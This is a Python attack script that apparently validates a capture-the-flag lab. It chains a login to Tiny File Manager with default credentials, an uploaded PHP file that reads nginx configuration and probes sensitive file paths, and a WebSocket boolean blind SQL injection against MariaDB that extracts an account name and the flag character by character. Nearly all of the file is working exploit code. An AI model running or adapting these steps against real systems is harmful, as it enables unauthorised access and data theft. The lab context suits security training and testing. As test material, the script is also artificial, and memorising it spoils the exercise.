#!/usr/bin/env python3
"""Black-box attacker over HTTP + WebSocket; no access to target filesystem."""
import http.cookiejar
import json
import os
import re
import urllib.error
import urllib.parse
import urllib.request
import uuid
import websocket

BASE = os.environ.get('TARGET_URL', 'http://soccer-target:8080').rstrip('/')
SOCKET = os.environ.get('TARGET_WS', 'ws://soccer-target:9091')
FLAG = os.environ['EXPECTED_USER_FLAG']
assert re.fullmatch(r'TTP\{[A-Za-z0-9_]+\}', FLAG)
jar = http.cookiejar.CookieJar()
client = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

def get(path, host='soccer-target:8080'):
    req = urllib.request.Request(BASE + path, headers={'Host': host})
    with client.open(req, timeout=20) as response:
        return response.status, response.read().decode('utf-8', 'replace')

def post_form(path, data):
    req = urllib.request.Request(BASE + path, data=urllib.parse.urlencode(data).encode(), headers={
        'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'soccer-target:8080'
    })
    with client.open(req, timeout=20) as response:
        return response.status, response.read().decode('utf-8', 'replace')

def upload_php(filename, contents):
    boundary = '----soccer' + uuid.uuid4().hex
    fields = [
        ('--' + boundary + '\r\nContent-Disposition: form-data; name="fullpath"\r\n\r\n' + filename + '\r\n').encode(),
        ('--' + boundary + '\r\nContent-Disposition: form-data; name="file"; filename="' + filename + '"\r\nContent-Type: application/octet-stream\r\n\r\n').encode() + contents.encode() + b'\r\n'
    ]
    body = b''.join(fields) + ('--' + boundary + '--\r\n').encode()
    req = urllib.request.Request(BASE + '/tiny/index.php?p=', data=body, headers={
        'Content-Type': 'multipart/form-data; boundary=' + boundary, 'Host': 'soccer-target:8080'
    })
    with client.open(req, timeout=30) as response:
        return response.status, response.read().decode('utf-8', 'replace')

def check(ws, ticket):
    ws.send(json.dumps({'id': ticket}))
    answer = ws.recv()
    assert answer in ('Ticket Exists', "Ticket Doesn't Exist"), (ticket, answer)
    return answer == 'Ticket Exists'

def predicate(ws, sql):
    return check(ws, '0 OR (' + sql + ')')

def extract_number(ws, expression, maximum=120):
    lo, hi = 0, maximum
    while lo < hi:
        mid = (lo + hi) // 2
        if predicate(ws, '(' + expression + ') > ' + str(mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo

print('[1/9] Public soccer page and natural /tiny/ discovery')
_, home = get('/')
assert 'CITY LEAGUE' in home and 'Tiny File Manager' not in home
_, fm = get('/tiny/')
assert 'Tiny File Manager' in fm and 'fm_usr' in fm

print('[2/9] Original Tiny File Manager vendor account')
_, fm = post_form('/tiny/index.php', {'fm_usr': 'admin', 'fm_pwd': 'admin@123'})
assert 'Logout' in fm or 'logout' in fm.lower() or 'uploads' in fm, fm[:700]
assert any(cookie.name == 'filemanager' for cookie in jar)

print('[3/9] Native Tiny File Manager multipart upload')
name = 'review_' + uuid.uuid4().hex[:8] + '.php'
php = "<?php header('Content-Type: text/plain'); echo file_get_contents('/etc/nginx/conf.d/soccer.conf'); echo '\\nFLAG_FILE='.(is_readable('/home/player/user.txt')?'READABLE':'UNREADABLE'); echo '\\nNODE_SOURCE='.(is_readable('/opt/soccer/server.js')?'READABLE':'UNREADABLE'); ?>"
status, response = upload_php(name, php)
assert status == 200 and 'success' in response.lower(), response[:500]

print('[4/9] PHP foothold reads real nginx vhost config, not the goal')
_, leaked = get('/tiny/uploads/' + name)
assert 'soc-player.soccer.htb' in leaked and '127.0.0.1:3000' in leaked, leaked
assert 'FLAG_FILE=UNREADABLE' in leaked and 'NODE_SOURCE=UNREADABLE' in leaked

print('[5/9] HTTP vhost and ticket application')
_, page = get('/check', host='soc-player.soccer.htb')
assert 'Check a ticket' in page and 'new WebSocket' in page
_, second = get('/', host='soc-player.soccer.htb')
assert 'Ticket Office' in second

print('[6/9] Real WebSocket / MariaDB boolean oracle')
ws = websocket.create_connection(SOCKET, timeout=15)
assert check(ws, '86881')
assert not check(ws, '999999')
assert check(ws, '0 OR 1=1')
assert not check(ws, '0 OR 1=2')

print('[7/9] Blindly extract database username')
account = "(SELECT username FROM accounts WHERE id=1)"
name_length = extract_number(ws, 'LENGTH(' + account + ')', 20)
assert name_length == len('player')
user = ''.join(chr(extract_number(ws, 'ASCII(SUBSTRING(' + account + ',' + str(i) + ',1))', 126)) for i in range(1, name_length + 1))
assert user == 'player', user

print('[8/9] Extract actual per-instance flag over WebSocket only')
expr = "(SELECT goal FROM accounts WHERE username='player')"
length = extract_number(ws, 'LENGTH(' + expr + ')', 100)
assert length == len(FLAG), (length, len(FLAG))
found = ''.join(chr(extract_number(ws, 'ASCII(SUBSTRING(' + expr + ',' + str(i) + ',1))', 126)) for i in range(1, length + 1))
assert found == FLAG, (found, FLAG)
ws.close()

print('[9/9] Flag is not in public HTTP routes')
try:
    get('/user.txt')
    raise AssertionError('Flag is publicly reachable')
except urllib.error.HTTPError as err:
    assert err.code == 404
print('PASS: upstream file manager -> PHP foothold -> vhost -> MariaDB WebSocket SQLi -> ' + found)
